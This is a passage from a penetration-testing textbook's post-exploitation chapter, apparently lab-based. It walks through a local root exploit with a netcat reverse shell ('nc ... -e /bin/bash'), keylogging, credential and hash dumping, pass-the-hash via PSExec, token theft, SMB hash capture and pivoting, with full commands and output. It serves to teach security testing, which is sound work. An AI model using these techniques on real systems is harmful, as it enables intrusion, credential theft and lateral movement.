some code there.\nCopying and Compiling the Exploit on the Target\nFirst we need to copy the exploit to our target and compile it so that it can\nrun. Luckily, the GCC C compiler is preinstalled on most Linux distribu-\ntions, so you can often compile local exploit code directly on the target. To\nfind out if GCC is installed, enter gcc as shown here.\ngeorgia@ubuntu:~$ gcc\ngcc: no input files\nAs you can see, GCC complains that it’s not been given any input, but\nthis tells us that GCC is present. Now to copy our exploit code to the Linux\ntarget. The Linux wget command lets us use the command line to pull a\nfile down from a web server, so let’s copy the C code to our Kali Linux web\nserver as shown here. Make sure the apache2 webserver is running in Kali.\nroot@kali:~# cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www\nNow switch to your SSH shell, and download the file with wget, as shown\nin Listing 13-15.\ngeorgia@ubuntu:~$ wget http://192.168.20.9/8572.c\n--2015-08-14 14:30:51-- http://192.168.20.9/8572.c\nConnecting to 10.0.1.24:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2768 (2.7K) [text/x-csrc]\nSaving to: `8572.c'\n100%[======================================>] 2,768 --.-K/s in 0s\n2015-08-14 14:30:52 (271 MB/s) - `8572.c' saved [2768/2768]\nListing 13-15: Using wget to download a file\nNow compile the exploit code with GCC on the Linux target as shown\nhere. Use the -o flag to specify an output file name for your compiled code.\nPost Exploitation 289\ngeorgia@ubuntu:~$ gcc -o exploit 8572.c\nNow to find that udev netlink socket PID mentioned in the exploit’s\nusage information (Listing 13-14) for our argument. The usage informa-\ntion noted that the PID we need is listed in /proc/net/netlink. cat out the file,\nas shown in Listing 13-16.\ngeorgia@ubuntu:~$ cat /proc/net/netlink\nsk Eth Pid Groups Rmem Wmem Dump Locks\nf7a90e00 0 5574 00000111 0 0 00000000 2\nda714400 0 6476 00000001 0 0 00000000 2\nda714c00 0 4200780 00000000 0 0 00000000 2\n--snip--\nf7842e00 15 2468 00000001 0 0 00000000 2\nf75d5c00 16 0 00000000 0 0 00000000 2\nf780f600 18 0 00000000 0 0 00000000 2\nListing 13-16: The /proc/net/netlink file\nThere’s more than one PID listed, but we know that the PID we need is\nusually the PID of the udev daemon minus 1. Look at the udev process with\nthe ps aux command, as shown here.\ngeorgia@ubuntu:~$ ps aux | grep udev\nroot 2469 0.0 0.0 2452 980 ? S<s 02:27 0:00 /sbin/udevd --daemon\ngeorgia 3751 0.0 0.0 3236 792 pts/1 S+ 14:36 0:00 grep udev\nThe udev daemon’s PID is 2469. One of the PIDs from Listing 13-16 is\n2468 (udev’s PID minus 1). Based on the exploit’s help information, this\nis the value we need. This value is going to change between reboots of the\nUbuntu target, so make sure you run these commands in your own lab to\nfind the correct value.\nadding Code to the /tmp/run File\nThe last thing we need is some code to be run as root in the file /tmp/run.\nLuckily, we also have Netcat installed on our Ubuntu system by default, so\nwe can create a simple Bash script to connect back to a listener on our Kali\nsystem, as discussed in Chapter 2. Here’s the script.\ngeorgia@ubuntu:~$ cat /tmp/run\n#!/bin/bash\nnc 192.168.20.9 12345 -e /bin/bash\nBefore running our exploit, we need to set up a listener on our Kali sys-\ntem to catch the incoming Netcat shell.\nroot@kali:~# nc -lvp 12345\nlistening on [any] 12345 ...\n290 Chapter 13\nFinally, we’re ready to run our compiled exploit. Remember to pass the\nPID of the udev netlink socket we found earlier as an argument.\ngeorgia@ubuntu:~$ ./exploit 2468\nNothing seems to happen on the Linux target, but if you turn back to\nthe Netcat listener on Kali, we have a connection. The whoami command tells\nus we now have root privileges, as shown in Listing 13-17.\nroot@kali:~# nc -lvp 12345\nlistening on [any] 12345 ...\n\n192.168.20.11: inverse host lookup failed: Unknown server error : Connection\ntimed out\nconnect to [192.168.20.9] from (UNKNOWN) [192.168.20.11] 33191\nwhoami\nroot\nListing 13-17: Gaining root privileges\nWe’ve successfully escalated our privileges using a public exploit. Local information gathering\nOnce we gain access to a system we should see if any potentially sensitive\ninformation is present, such as installed software that stores passwords in\nplaintext or using a weak hashing algorithm, proprietary data or source\ncode, customer credit card information, or the CEO’s email account. These\nare all useful bits of information to present in the final report to the cus-\ntomer. Additionally, any information we find may help us break into other\nsystems in the network that hold even greater spoils. We will look at moving from system to system later in this chapter, but for\nnow let’s look at a few interesting ways to find information on the local system. Searching for Files\nWe can tell Meterpreter to search for interesting files. For example in\nListing 13-18, I tell Meterpreter to look for any filenames that contain the\nname password. meterpreter > search -f *password*\nFound 8 results... c:\\\\WINDOWS\\Help\\password.chm (21891 bytes)\nc:\\\\xampp\\passwords.txt (362 bytes)\nc:\\\\xampp\\php\\PEAR\\Zend\\Dojo\\Form\\Element\\PasswordTextBox.php (1446 bytes)\nc:\\\\xampp\\php\\PEAR\\Zend\\Dojo\\View\\Helper\\PasswordTextBox.php (1869 bytes)\nc:\\\\xampp\\php\\PEAR\\Zend\\Form\\Element\\Password.php (2383 bytes)\nc:\\\\xampp\\php\\PEAR\\Zend\\View\\Helper\\FormPassword.php (2942 bytes)\nc:\\\\xampp\\phpMyAdmin\\user_password.php (4622 bytes)\nc:\\\\xampp\\phpMyAdmin\\libraries\\display_change_password.lib.php (3467 bytes)\nListing 13-18: Using Meterpreter to look for files\nPost Exploitation 291\nKeylogging\nAnother way to gather information is to let the logged-in user give it to you,\nso to speak. Meterpreter has a keylogger we can use to listen for keystrokes. Perhaps the user is logging in to websites or other systems on the network\nwhile our Meterpreter session is active. Start the keylogger on the Windows XP\nMeterpreter session by entering keyscan_start, as shown here. meterpreter > keyscan_start\nStarting the keystroke sniffer... note You will capture keystrokes only in your current context. For my example, I used my\noriginal Windows XP session where I am the user georgia in the explorer.exe pro-\ncess, and thus can sniff georgia’s keystrokes. Another interesting idea is to migrate\ninto the winlogon process, where you will see only login information that is typed—\ncertainly useful information. Now switch to Windows XP, and type something. In my example I typed\nctrl-R to open the Run dialog. Then I entered notepad.exe to start the\nNotepad program and typed hi georgia into Notepad. To see any keystrokes the keylogger has logged, enter keyscan_dump as\nshown here. As you can see, all of the keystrokes I typed were logged. meterpreter > keyscan_dump\nDumping captured keystrokes... <LWin> notepad.exe <Return> hi georgia <Return>\nTo stop the keylogger, enter keyscan_stop in Meterpreter as shown here. meterpreter > keyscan_stop\nStopping the keystroke sniffer... Gathering Credentials\nIn Chapter 9, we worked with password hashes from Windows, Linux, and\nthe FileZilla FTP server, but users may have other stored credentials on\ntheir local system. Metasploit has several post modules for gathering pass-\nwords for specific software in /usr/share/metasploit-framework/modules/post/\nwindows/gather/credentials. For our example, we will look at stealing stored\ncredentials from WinSCP, a secure copy tool for Windows. As shown in Figure 13-1, open WinSCP, set the File protocol to SCP, the\nHost name to the IP address of the Ubuntu target, and the credentials to\ngeorgia:password. Click Save As under the login information. 292 Chapter 13\nFigure 13-1: Connecting with WinSCP\nnote Like some of the other tools used in this book, the WinSCP GUI may be updated in the\nfuture, so your version may not look exactly like this. You will be prompted for a session name, as shown in Figure 13-2. Check\nthe Save password box before clicking OK. Even WinSCP warns you that\nsaving passwords is a bad idea. Figure 13-2: Saving credentials in WinSCP\nPost Exploitation 293\nNow switch back to Kali Linux, and use the module post/windows/gather/\ncredentials/winscp, as shown in Listing 13-19. Because this is a post module,\nthe only option you will need to supply is the ID of the Windows XP session. msf > use post/windows/gather/credentials/winscp\nmsf post(winscp) > show options\nModule options (post/windows/gather/credentials/winscp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSESSION yes The session to run this module on. msf post(winscp) > set session 1\nsession => 1\nmsf post(winscp) > exploit\n[*] Looking for WinSCP.ini file storage... [*] WinSCP.ini file NOT found... [*] Looking for Registry Storage... [*] Host: 192.168.20.9 Port: 22 Protocol: SSH Username: georgia Password: password u\n[*] Done! [*] Post module execution completed\nListing 13-19: Stealing stored credentials from WinSCP\nAs shown in Listing 13-19, the module discovers our saved credentials u. Based on the software your pentesting targets are running, there may be\nother credential-gathering targets that will come in handy in the field. net Commands\nThe Windows net command will allow us to view and edit network infor-\nmation. Using various options, we can gain valuable information. Drop\nto a Windows command shell using the Meterpreter command shell, as\nshown here. meterpreter > shell\n--snip--\nCopyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>\nThe command net users will show us all local users. Tacking on the\nword /domain at the end of this and many net commands will show informa-\ntion about the domain rather than the local system, but because our targets\nare not joined to a domain, we’ll stick with net users. C:\\Windows\\system32> net users\nnet users\nUser accounts for \\\\\n------------------------------------------------------------------------------\nAdministrator georgia secret Guest\n294 Chapter 13\nWe can also see the members of a group with the command net\nlocalgroup group as shown in Listing 13-20. C:\\Windows\\system32> net localgroup Administrators\nnet localgroup Administrators\nAlias name Administrators\nComment Administrators have complete and unrestricted access to the computer/domain\nMembers\n-----------------------------------------------------------------------------------------------\nAdministrator\ngeorgia\nsecret\nThe command completed successfully. Listing 13-20: Viewing local administrators with net commands\nTo exit the shell and drop back into Meterpreter, type exit. These are just a couple of examples of useful net commands. We’ll look\nat using net commands to add a user later in this chapter. Another Way In\nIn Chapter 5, we used Nmap to run a UDP scan. By definition, UDP scans\nare not as exact as TCP scans. For example, port 69/UDP on the Windows XP\ntarget, traditionally the port for TFTP, returned open|filtered in our UDP\nNmap scan. Because our scan did not receive any response, it was unclear if\nanything was listening there at all. Short of fuzzing the TFTP server and pos-\nsibly crashing it, it would be difficult to ascertain which TFTP software, if any,\nis running. Now that we have access to the system, we can further investigate\nrunning software for any vulnerabilities we may have missed. note Earlier in the chapter we used the Meterpreter ps command to view all running pro-\ncesses on the Windows XP target. One of these is 3CTftpSvc.exe, an older version\nof the 3Com TFTP service that is subject to a buffer overflow condition in the TFTP\nlong transport mode. (We’ll write an exploit for this issue by hand in Chapter 19, but\nthere’s a Metasploit module for this issue as well.) Though it would be difficult for an\nattacker to identify this issue remotely, the software is still vulnerable, and we should\ninclude it in our pentest report. It may be that you won’t discover a network-facing vulnerability until\nafter you have gained access to the system. Without sending random TFTP\ninput to the server and analyzing the results, it would be difficult for us to\nfind this issue. Checking Bash History\nOne place to look for potentially interesting information on a Linux system\nis in a user’s Bash history. When a Bash shell is closed, the commands that\nhave been executed are written to a file called .bash_history in the user’s\nPost Exploitation 295\nhome directory. A perhaps rather contrived example where the user’s pass-\nword is saved in plaintext in the Bash history file is shown here. georgia@ubuntu:~$ cat .bash_history\nmy password is password\n--snip--\nLateral movement\nOnce we have access to one system in a networked environment, can we use\nit to access additional systems and their sensitive data? If our exploited sys-\ntem is a member of a domain, we can certainly try to compromise a domain\naccount or ideally get domain administrator access so that we can log in to\nand manage all systems in the domain. But even if you can’t get control of a domain, you may still be able to\naccess the systems in that domain if they were all installed from the same\nsystem install image with the same local administrator password that has\nnever been changed. If we can crack this password for one machine, we may\nbe able to log in to many machines in the environment without domain\naccess. Also, if a user has an account on multiple systems, he or she may\nuse the same password on each system, which might allow us to log in with\ncredentials we found elsewhere in the environment. (Good password poli-\ncies help prevent these kinds of vulnerabilities, but passwords are often the\nweakest link, even in high-security environments.)\nLet’s look at a few techniques for turning access to one system into\naccess to many. PSExec\nThe PSExec technique originated in the Sysinternals Windows manage-\nment tool set in the late 1990s. The utility worked by using valid credentials\nto connect to the ADMIN$ share on the Windows XP SMB server. PSExec\nuploads a Windows service executable to the ADMIN$ share and then con-\nnects to the Windows Service Control Manager using remote procedure\ncall (RPC) to start the executable service. The service then sets up an SMB\nnamed pipe to send commands and remotely control the target system. The Metasploit module exploit/windows/smb/psexec implements a very\nsimilar technique. The module requires a running SMB server on the tar-\nget and credentials that give access to the ADMIN$ share. In Chapter 9, we cracked the password hashes for users on our\nWindows XP target. You can probably imagine using the found creden-\ntials and PSExec to gain access to additional systems. Use the credentials\ngeorgia:password with the PSExec module, as shown in Listing 13-21. msf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > show options\nModule options (exploit/windows/smb/psexec):\n296 Chapter 13\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 445 yes Set the SMB service port\nSHARE ADMIN$ yes The share to connect to, can be an admin share\n(ADMIN$,C$,...) or a normal read/write folder share\nSMBDomain WORKGROUP no The Windows domain to use for authentication\nSMBPass no The password for the specified username\nSMBUser no The username to authenticate as\nmsf exploit(psexec) > set RHOST 192.168.20.10\nRHOST => 10.0.1.13\nmsf exploit(psexec) > set SMBUser georgiau\nSMBUser => georgia\nmsf exploit(psexec) > set SMBPass passwordv\nSMBPass => password\nmsf exploit(psexec) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Connecting to the server... [*] Authenticating to 192.168.20.10:445|WORKGROUP as user 'georgia'... [*] Uploading payload... [*] Created \\KoMknErc.exe...\n\n--snip--\n[*] Meterpreter session 6 opened (192.168.20.9:4444 -> 192.168.20.10:1173) at 2015-08-14\n14:13:40 -0400\nListing 13-21: Using the PSExec module\nIn addition to RHOST, we need to tell the module which SMBDomain,\nSMBUser, and SMBPass to use. Our Windows XP target is not a mem-\nber of a domain, so we can leave the SMBDomain option at the default,\n\nWORKGROUP. Set SMBUser to georgia u and SMBPass to password v, our discovered\ncredentials. Then run the exploit module. The module embeds the chosen\npayload (in this case, the default windows/meterpreter/reverse_tcp) into a\nWindows service image executable. After uploading the executable and con-\ntacting Windows Service Control Manager, the service copies the shellcode\ninto executable memory for the service process and redirects execution to\nthe payload. Thus our payload runs and connects back to our Metasploit\nlistener on Kali. Even though we logged on as the user georgia, because our\npayload is running as a system service, our session automatically has system\nprivileges. note This is why we made the change to the Windows XP Security Policy in Chapter 1. If\nWindows XP were a member of a domain, we could fill in the SMBDomain option\nand use PSExec to get System access on any system where the domain user was a local\nadministrator. This is a great way to move around a network looking for interesting\ninformation, additional password hashes, and more vulnerabilities. Post Exploitation 297\nPass the Hash\nOur previous attack relied on our ability to reverse the password hash and\ngain access to the plaintext password for a user account. Of course, in the\ncase of our Windows XP target, this is trivial because it uses the entirely\ncrackable LM hashing algorithm. In Chapter 9, we learned that when we have only the NTLM user\nauthentication hash of a password, instead of the weaker LM version, our\nability to reverse the hash in a reasonable amount of time depends on the\nweakness of the password, the strength of our wordlist, and even the algo-\nrithms employed by the password-cracking program. If we can’t reverse the\npassword hash, we’re going to have a tough time logging in to other systems\nwith the plaintext credentials. PSExec comes to the rescue again. When a user logs in over SMB, his or\nher password is not sent to the target in plaintext. Instead, the target system\nissues a challenge that can be answered only by someone with the correct\npassword. In this case, the answer to the challenge is the LM- or NTLM-\nhashed password, depending on the implementation. When you log in to a remote system, your Windows application calls\na utility to hash the password, and that hash is sent to the remote system\nfor authentication. The remote system assumes that if you send the correct\nhash, you must have access to the correct plaintext password—that is, after\nall, one of the fundamentals of one-way hash functions. Can you think of a\nscenario where you might have access to password hashes but not the plain-\ntext passwords? In Chapter 9, we were able to reverse all password hashes on our target\nsystems. Additionally, on our Windows XP target, we were able to reverse\nthe LM hashes regardless of the strength of the password. But let’s simu-\nlate a situation where we have only password hashes, as shown with the\nMeterpreter hashdump command in Listing 13-22. meterpreter > hashdump\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\ngeorgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:93880b42019f250cd197b67718ac9a3d:86da9cefbdedaf62b66d9b2fe8816c1f:::\nsecret:1004:e52cac67419a9a22e1c7c53891cb0efa:9bff06fe611486579fb74037890fda96:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:6f552ba8b5c6198ba826d459344ceb14:::\nListing 13-22: Using hashdump\nnote When using the hashdump Meterpreter command against newer Windows operating\nsystems, you may find that it fails. An alternative is the post module: post/windows/\ngather/hashdump. There is even post/windows/gather/smart_hashdump,\nwhich can not only gather local hashes but also active directory hashes if you have\nexploited a domain controller. So if at first you don’t succeed in dumping password\nhashes on a pentest, explore additional options. 298 Chapter 13\nLet’s use the Metasploit PSExec module to take advantage of how SMB\nauthenticates and a technique called Pass the Hash. Instead of setting the\nSMBPass option to georgia’s password, copy in the LM and NTLM hashes for\ngeorgia from the hashdump in Listing 13-23 as the SMBPass option. msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nSMBPass => e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nmsf exploit(psexec) > exploit\n--snip--\n[*] Meterpreter session 7 opened (192.168.20.9:4444 -> 192.168.20.10:1233) at 2015-08-14 14:17:47\n-0400\nListing 13-23: PSExec Pass the Hash\nAgain we’re able to use PSExec to get a Meterpreter session. Even\nwithout knowing the plaintext password, the password hash alone can be\nenough to get access to other systems in the environment using PSExec. SSHExec\nLike PSExec for Windows, we can use SSHExec to move through an envi-\nronment’s Linux systems if we have even one set of valid credentials, which\nare likely to work elsewhere in the environment. The Metasploit module\nmulti/ssh/sshexec and its options are shown in Listing 13-24. msf > use exploit/multi/ssh/sshexec\nmsf exploit(sshexec) > show options\nModule options (exploit/multi/ssh/sshexec):\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASSWORD yes The password to authenticate with. RHOST yes The target address\nRPORT 22 yes The target port\nUSERNAME root yes The user to authenticate as. --snip--\nmsf exploit(sshexec) > set RHOST 192.168.20.11\nRHOST => 192.168.20.11\nmsf exploit(sshexec) > set USERNAME georgiau\nUSERNAME => georgia\nmsf exploit(sshexec) > set PASSWORD passwordv\nPASSWORD => password\nmsf exploit(sshexec) > show payloads\n--snip--\nlinux/x86/meterpreter/reverse_tcp normal Linux Meterpreter, Reverse TCP\nStager\n--snip--\nmsf exploit(sshexec) > set payload linux/x86/meterpreter/reverse_tcp\npayload => linux/x86/meterpreter/reverse_tcp\nmsf exploit(sshexec) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(sshexec) > exploit\nPost Exploitation 299\n[*] Started reverse handler on 192.168.20.9:4444\n--snip--\n[*] Meterpreter session 10 opened (192.168.20.9:4444 -> 192.168.20.11:36154)\nat 2015-03-25 13:43:26 -0400\nmeterpreter > getuid\nServer username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000,\nsgid=1000\nmeterpreter > shell\nProcess 21880 created. Channel 1 created. whoami\ngeorgia\nListing 13-24: Using SSHExec\nIn this example, we know the credentials georgia:password from having\ncracked them in Chapter 9. Although in this case we will just be logging into\nthe same host again (similar to what we did in “PSExec” on page 296), we\ncould use this same technique on other hosts in that same environment\nthat have an account for georgia. As with PSExec, we need valid credentials in order to authenticate. We\nset the USERNAME to georgia u and PASSWORD to password v, and then choose\nlinux/x86/meterpreter/reverse_tcp as the payload. Unlike with PSExec (which uploaded a binary and ran it as a System\nservice, automatically giving us System privileges), with SSHExec we are\nstill user georgia. You can see how this exploit could prove to be a quick way\nto move around an environment in search of additional information and\nvulnerabilities on other Linux systems. Token Impersonation\nNow that we know we might not even need plaintext passwords to gain\naccess to other systems, is there any case where we may not even need the\npassword hashes? One interesting Windows security construct is the concept of tokens. Tokens are primarily used for access control. Based on the token of a pro-\ncess, the operating system can make decisions about which resources and\noperations should be made available to it. Think of a token as a kind of temporary key that gives you access to\ncertain resources without having to enter your password every time you\nwant to perform a privileged operation. When a user logs in to the system\ninteractively, such as directly through the console or from a remote desktop,\na delegation token is created. Delegation tokens allow the process to impersonate the token on the\nlocal system as well as on the network, for example on other systems in a\ndomain. Delegation tokens contain credentials and can be used to authen-\nticate with other systems that use these credentials, such as the domain\ncontroller. Tokens persist until reboot, and even if a user logs out, his or her\n300 Chapter 13\ntoken will still be present on the system until it shuts down. If we can steal\nanother token on the system, we can potentially gain additional privileges\nand even access to additional systems. Incognito\nWe’re on a compromised system: our Windows XP target. Which tokens are\non the system, and how do we steal them? Incognito was originally a stand-\nalone tool developed by security researchers conducting research into using\ntoken stealing for privilege escalation, but it has since been added as an\nextension to Meterpreter. Incognito will help us enumerate and steal all the\ntokens on a system. Incognito is not loaded into Meterpreter by default, but we can add it\nwith the load command, as shown here. Use one of your Meterpreter sessions\ncurrently running as system, or use privilege escalation to elevate your access. (System has access to all tokens on the target.)\nmeterpreter > load incognito\nLoading extension incognito...success. Before we use Incognito, switch users on your Windows XP target and\nlog in as secret with the password Password123. This login will create a delega-\ntion token on the target for us to impersonate. As we list tokens, Incognito\nsearches all handles on the system to determine which ones belong to tokens\nusing low-level Windows API calls. To see all the user tokens available with\nthe Meterpreter Incognito, enter the command list_tokens -u as shown in\nListing 13-25. meterpreter > list_tokens -u\nDelegation Tokens Available\n========================================\nBOOKXP\\georgia\nBOOKXP\\secret\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nListing 13-25: Enumerating tokens with Incognito\nWe see tokens for both georgia and secret. Let’s try stealing secret’s\ndelegation token, effectively gaining the privileges of this user. Use the\nimpersonate_token command to steal the token, as shown in Listing 13-26.\n\n(Note that we use two backslashes to escape the backslash between the\ndomain—in this case, the local machine name—and the username.)\nmeterpreter > impersonate_token BOOKXP\\\\secret\n[+] Delegation token available\n[+] Successfully impersonated user BOOKXP\\secret\nPost Exploitation 301\nmeterpreter > getuid\nServer username: BOOKXP\\secret\nListing 13-26: Stealing a token with Incognito\nHaving stolen secret’s token, if we run getuid we should see that we are\neffectively now the user secret. This can be especially interesting when in a\ndomain: If secret is a domain administrator, we are now a domain adminis-\ntrator as well, and we can do things like create a new domain administrator\naccount or change the domain administrator’s password. (We’ll look at how\nto add accounts from the command line in “Persistence” on page 309.)\nSMB Capture\nLet’s look at one more interesting consequence of token stealing. In a\ndomain, password hashes for domain users are stored only on the domain\ncontroller, which means that running a hashdump on an exploited system\nwill give us password hashes only for local users. We don’t have a domain\nset up, so secret’s password hash is stored locally, but imagine that secret is\ninstead a domain user. Let’s look at a way of capturing the password hashes\nwithout gaining access to the domain controller by passing the hash to an\nSMB server we control and recording the results. Open a second instance of Msfconsole, and use the module auxiliary/\nserver/capture/smb to set up an SMB server and capture any authentication\nattempts. Like the client-side attack modules we studied in Chapter 10, this\nmodule does not directly attack another system; it just sets up a server and\nwaits. Set up the module options as shown in Listing 13-27. msf > use auxiliary/server/capture/smb\nmsf auxiliary(smb) > show options\nModule options (auxiliary/server/capture/smb):\nName Current Setting Required Description\n---- --------------- -------- -----------\nCAINPWFILE no The local filename to store the hashes in Cain&Abel\nformat\nCHALLENGE 1122334455667788 yes The 8 byte challenge\nJOHNPWFILE no The prefix to the local filename to store the hashes\nin JOHN format\nSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address\non the local machine or 0.0.0.0\nSRVPORT 445 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections\nSSLCert no Path to a custom SSL certificate (default is\nrandomly generated)\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nmsf auxiliary(smb) > set JOHNPWFILE /root/johnfileu\nJOHNPWFILE => johnfile\nmsf auxiliary(smb) > exploit\nListing 13-27: Using the SMB capture module\n302 Chapter 13\nYou can save the results to a CAINPWFILE or a JOHNPWFILE, which\nwill save the captured hashes in the formats expected by the Cain and\nAbel password tool for Windows and John the Ripper, respectively. Let’s\nset it to JOHNPWFILE u because we learned how to use John in Chapter 9. Now return to your Meterpreter session where you impersonated secret’s\ntoken in the previous section, and drop to a shell, as shown next. Because\nwe’ve stolen secret’s token, this shell should be running as secret. Knowing\nthat delegation tokens include credentials to authenticate with other sys-\ntems, we’ll use the net use Windows command to attempt to authenticate\nwith our fake SMB capture server. Connect to any share you like on the Kali SMB server. The login will\nfail, but the damage will be done. meterpreter > shell\nC:\\Documents and Settings\\secret>net use \\\\192.168.20.9\\blah\nReturning to your SMB Capture Msfconsole window, you should see\nthat you’ve captured a set of password hashes. [*] SMB Captured - 2015-08-14 15:11:16 -0400\nNTLMv1 Response Captured from 192.168.20.10:1078 – 192.168.20.10\nUSER:secret DOMAIN:BOOKXP OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1\nLMHASH:76365e2d142b5612338deca26aaee2a5d6f3460500532424\nNTHASH:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c\nnote This exercise can be a bit flaky, particularly without a Windows domain present. You\nmight have trouble capturing the hash and instead get something like this:\n[*] SMB Capture - Empty hash captured from 192.168.20.10:1050 - 192.168.20.10\ncaptured, ignoring ... This is a common issue. Just try to understand the concepts so you can try them in\nclient environments where Windows domains are deployed. The results are saved in the proper format in the JOHNPWFILE\nMetasploit module option for auxiliary/server/capture/smb. For example,\nsince we set our JOHNPWFILE as /root/johnfile, the file to feed into John is\n/root/johnfile_netntlm. When you compare the hashes to those dumped with\nhashdump in Listing 13-22, you’ll see that the hashes for secret differ. What’s\ngoing on? As it turns out, these hashes are for NETLM and NETNTLM,\nwhich are a bit different than the regular LM and NTLM Windows hashes\nwe worked with in Chapter 9. And when you look at the JOHNPWFILE, you’ll\nsee that its format is a bit different from what we’ve seen previously with\nJohn the Ripper. secret::BOOKXP:76365e2d142b5612338deca26aaee2a5d6f3460500532424:f2148557db0456\n441e57ce35d83bd0a27fb71fc8913aa21c:1122334455667788\nPost Exploitation 303\nIn particular, the hash entry has taken note of the CHALLENGE option set\nin Metasploit. Though the user secret has a local hash on our Windows XP\ntarget that would save us the trouble of cracking NETLM and NETNTLM\nhashes, this is a useful trick for grabbing password hashes when working\nwith domain user accounts, which store their password hashes only on the\ndomain controllers. Pivoting\nNow let’s see if we can use access to a system to gain access to another net-\nwork entirely. Typically an organization has only a few Internet-facing sys-\ntems—hosting services that need to be made available to the Internet such\nas web servers, email, VPNs, and so on. These services may be hosted by a\nprovider such as Google or GoDaddy, or they may be hosted in house. If\nthey are hosted in house, gaining access to them from the Internet may give\nyou access to the internal network. Ideally their internal network will be seg-\nmented by business unit, level of sensitivity, and so on, such that access to one\nmachine does not give direct network access to all machines in the enterprise. note Internet-facing systems may be dual homed, or a member of multiple networks, namely\nthe Internet and an internal network. A security best practice is to keep dual-homed\nsystems segregated from sensitive internal network resources in a demilitarized zone,\nbut I have performed penetration tests for clients who have Internet-facing systems as\npart of their internal domain. All I had to do was exploit their web application, which\nhad a default password for the administrative account, and upload a PHP shell as we\ndid to XAMPP in Chapter 8, and suddenly I had access to a system on their internal\ndomain. Hopefully, most of your clients will require a few more steps between piercing\nthe perimeter and domain access. When we set up our Windows 7 target in Chapter 1, we gave it two virtual\nnetwork adapters. We connected one to the bridged network where it could\ntalk to the other targets and our Kali virtual machine. The other virtual\nadapter is connected to the host-only network. For this exercise, switch the\nWindows XP target to the host-only network so it is no longer accessible by\nthe Kali system. (For more information on changing virtual network settings,\nsee “Creating the Windows 7 Target” on page 48.)\nThough this is a Windows system, Meterpreter allows us to use the\nifconfig command to see networking information. As shown in Listing 13-28,\nthe Windows 7 target is part of two networks: the 192.168.20.0/24 network,\nwhich also includes our Kali system, and the 172.16.85.0/24 network, which\nour Kali system does not have access to. meterpreter > ifconfig\nInterface 11\n============\nName : Intel(R) PRO/1000 MT Network Connection\nHardware MAC : 00:0c:29:62:d5:c8\n\nMTU : 1500\nIPv4 Address : 192.168.20.12\n304 Chapter 13\nIPv4 Netmask : 255.255.255.0\nInterface 23\n============\nName : Intel(R) PRO/1000 MT Network Connection #2\nHardware MAC : 00:0c:29:62:d5:d2\n\nMTU : 1500\nIPv4 Address : 172.16.85.191\nIPv4 Netmask : 255.255.255.0\nListing 13-28: Dual-homed system networking information\nWe can’t attack any systems in the 172.16.85.0 network directly from\nKali. However, because we have access to the Windows 7 target, we can use\nit as a jumping-off point, or pivot, to further explore this second network, as\nshown in Figure 13-3.\nKali Windows 7\n\n192.168.20.9 192.168.20.12\n\n172.16.85.191\nWindows XP\n\n172.16.85.190\nFigure 13-3: Pivoting through an exploited system\nAt this point we could start uploading our hack tools to the Windows 7\ntarget to begin the penetration test on the 172.16.85.0 network, but that\nattempt would likely be caught by antivirus software, and we’d have to clean\nup the mess left behind. Metasploit gives us another option: We can route\nall of the traffic for our target network through an open Metasploit session.\nAdding a Route in Metasploit\nThe route command in Metasploit tells Metasploit where to route traffic.\nInstead of routing traffic to an IP address, we send traffic destined for a net-\nwork through a specific open session. In this case, we want to send all traf-\nfic headed to the 172.16.85.0 network through the Windows 7 session. The\nsyntax for the route command in Metasploit is route add network <subnet mask>\n<session id>.\nmsf > route add 172.16.85.0 255.255.255.0 2\nPost Exploitation 305\nNow any traffic we send from Metasploit to the 172.16.85.0 network will\nautomatically be routed through the Windows 7 session (session 2 in my\ncase). We can set options such as RHOST or RHOSTS to systems in this network,\nand Metasploit will get traffic to the right place.\nMetasploit Port Scanners\nOne of the first things we did when information gathering in Chapter 5 was\nto port scan our targets with Nmap. We won’t be able to use external tools\nwith our Metasploit route, but luckily Metasploit has some port-scanning\nmodules we can use instead, like the scanner/portscan/tcp module, which will\nperform a simple TCP port scan, as shown in Listing 13-29.\nmsf > use scanner/portscan/tcp\nmsf auxiliary(tcp) > show options\nModule options (auxiliary/scanner/portscan/tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nCONCURRENCY 10 yes The number of concurrent ports to check per host\nPORTS u1-10000 yes Ports to scan (e.g. 22-25,80,110-900)\nRHOSTS yes The target address range or CIDR identifier\nTHREADS 1 yes The number of concurrent threads\nTIMEOUT 1000 yes The socket connect timeout in milliseconds\nmsf auxiliary(tcp) > set RHOSTS 172.16.85.190\nrhosts => 172.16.85.190\nmsf auxiliary(tcp) > exploit\n[*] 172.16.85.190:25 - TCP OPEN\n[*] 172.16.85.190:80 - TCP OPEN\n[*] 172.16.85.190:139 - TCP OPEN\n[*] 172.16.85.190:135 - TCP OPEN\n[*] 172.16.85.190:180 - TCP OPEN\n--snip--\nListing 13-29: Port scanning with Metasploit\nSet the RHOSTS option as usual for auxiliary modules. By default Metasploit\nscans port 